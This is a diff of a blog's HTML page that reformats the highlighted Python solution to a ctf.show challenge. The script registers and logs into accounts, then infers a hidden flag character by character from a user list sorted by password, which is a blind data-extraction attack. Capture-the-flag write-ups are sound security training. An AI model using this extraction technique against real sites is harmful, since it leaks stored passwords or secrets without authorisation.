-<span id="cb33-13"><a href="#cb33-13" aria-hidden="true" tabindex="-1"></a>        l <span class="op">=</span> k<span class="op">+</span>i</span>
-<span id="cb33-14"><a href="#cb33-14" aria-hidden="true" tabindex="-1"></a>        l2 <span class="op">=</span> k<span class="op">+</span><span class="bu">chr</span>(<span class="bu">ord</span>(i)<span class="op">-</span><span class="dv">1</span>)</span>
-<span id="cb33-15"><a href="#cb33-15" aria-hidden="true" tabindex="-1"></a>        data <span class="op">=</span> &#123;<span class="st">&#39;username&#39;</span>: l,</span>
-<span id="cb33-16"><a href="#cb33-16" aria-hidden="true" tabindex="-1"></a>                <span class="st">&#39;email&#39;</span>: <span class="st">&#39;c&#39;</span>,</span>
-<span id="cb33-17"><a href="#cb33-17" aria-hidden="true" tabindex="-1"></a>                <span class="st">&#39;nickname&#39;</span>: <span class="st">&#39;c&#39;</span>,</span>
-<span id="cb33-18"><a href="#cb33-18" aria-hidden="true" tabindex="-1"></a>                <span class="st">&#39;password&#39;</span>: l</span>
-<span id="cb33-19"><a href="#cb33-19" aria-hidden="true" tabindex="-1"></a>                &#125;</span>
-<span id="cb33-20"><a href="#cb33-20" aria-hidden="true" tabindex="-1"></a>        data2 <span class="op">=</span> &#123;<span class="st">&#39;username&#39;</span>: l,</span>
-<span id="cb33-21"><a href="#cb33-21" aria-hidden="true" tabindex="-1"></a>                 <span class="st">&#39;password&#39;</span>: l</span>
-<span id="cb33-22"><a href="#cb33-22" aria-hidden="true" tabindex="-1"></a>                 &#125;</span>
-<span id="cb33-23"><a href="#cb33-23" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (l <span class="op">==</span> <span class="st">&#39;flag&#39;</span>):</span>
-<span id="cb33-24"><a href="#cb33-24" aria-hidden="true" tabindex="-1"></a>            k <span class="op">=</span> <span class="st">&#39;flag&#39;</span></span>
-<span id="cb33-25"><a href="#cb33-25" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(k)</span>
-<span id="cb33-26"><a href="#cb33-26" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span>
-<span id="cb33-27"><a href="#cb33-27" aria-hidden="true" tabindex="-1"></a>        session <span class="op">=</span> requests.session()</span>
-<span id="cb33-28"><a href="#cb33-28" aria-hidden="true" tabindex="-1"></a>        r1 <span class="op">=</span> session.post(url1, data)</span>
-<span id="cb33-29"><a href="#cb33-29" aria-hidden="true" tabindex="-1"></a>        r2 <span class="op">=</span> session.post(url2, data)</span>
-<span id="cb33-30"><a href="#cb33-30" aria-hidden="true" tabindex="-1"></a>        r3 <span class="op">=</span> session.get(url3)</span>
-<span id="cb33-31"><a href="#cb33-31" aria-hidden="true" tabindex="-1"></a>        t <span class="op">=</span> r3.text</span>
-<span id="cb33-32"><a href="#cb33-32" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(l)</span>
-<span id="cb33-33"><a href="#cb33-33" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(t.find(<span class="st">&quot;&lt;td&gt;&quot;</span><span class="op">+</span>l<span class="op">+</span><span class="st">&quot;&lt;/td&gt;&quot;</span>))</span>
-<span id="cb33-34"><a href="#cb33-34" aria-hidden="true" tabindex="-1"></a>        <span class="bu">print</span>(t.find(<span class="st">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>))</span>
-<span id="cb33-35"><a href="#cb33-35" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (t.find(<span class="st">&quot;&lt;td&gt;&quot;</span><span class="op">+</span>l<span class="op">+</span><span class="st">&quot;&lt;/td&gt;&quot;</span>) <span class="op">&gt;</span> t.find(<span class="st">&quot;&lt;td&gt;flag@ctf.show&lt;/td&gt;&quot;</span>)):    <span class="op">//</span> 用index会因查找不到字符串而抛出异常</span>
-<span id="cb33-36"><a href="#cb33-36" aria-hidden="true" tabindex="-1"></a>            k <span class="op">=</span> l2</span>
-<span id="cb33-37"><a href="#cb33-37" aria-hidden="true" tabindex="-1"></a>            <span class="bu">print</span>(k)</span>
-<span id="cb33-38"><a href="#cb33-38" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span></span></code></pre></div>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+url <span class="token operator">=</span> <span class="token string">"http://410bc6b8-0a07-434c-bb4f-c8b9501b06e6.challenge.ctf.show/"</span>
+url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/reg.php"</span>  <span class="token comment"># 注册页面</span>
+url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/login.php"</span>  <span class="token comment"># 登录界面</span>
+url3 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/user_main.php?order=pwd"</span>  <span class="token comment"># 查询界面</span>
+k <span class="token operator">=</span> <span class="token string">""</span>
+s <span class="token operator">=</span> <span class="token string">"-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span>
+<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>
+        <span class="token comment"># print(i)</span>
+        l <span class="token operator">=</span> <span class="token string">""</span>
+        l <span class="token operator">=</span> k<span class="token operator">+</span>i
+        l2 <span class="token operator">=</span> k<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> l<span class="token punctuation">,</span>
+                <span class="token string">'email'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>
+                <span class="token string">'nickname'</span><span class="token punctuation">:</span> <span class="token string">'c'</span><span class="token punctuation">,</span>
+                <span class="token string">'password'</span><span class="token punctuation">:</span> l
+                <span class="token punctuation">&#125;</span>
+        data2 <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> l<span class="token punctuation">,</span>
+                 <span class="token string">'password'</span><span class="token punctuation">:</span> l
+                 <span class="token punctuation">&#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            k <span class="token operator">=</span> <span class="token string">'flag'</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+        session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r1 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        r2 <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url2<span class="token punctuation">,</span> data<span class="token punctuation">)</span>
+        r3 <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url3<span class="token punctuation">)</span>
+        t <span class="token operator">=</span> r3<span class="token punctuation">.</span>text
+        <span class="token keyword">print</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>l<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>l<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span> <span class="token operator">></span> t<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>	<span class="token operator">//</span> 用index会因查找不到字符串而抛出异常
+            k <span class="token operator">=</span> l2
+            <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span>
+            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>解析：</strong></p>
 <ol type="1">
 <li><p>针对flag的格式，flag中每一个字符的比对都遵循一个原则</p>
@@ -2240,7 +2214,7 @@ alt="image-20230528013334515" /></p></li>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">235.4k</span>&nbsp;字
+                class="white-color">230.3k</span>&nbsp;字
             
             
             
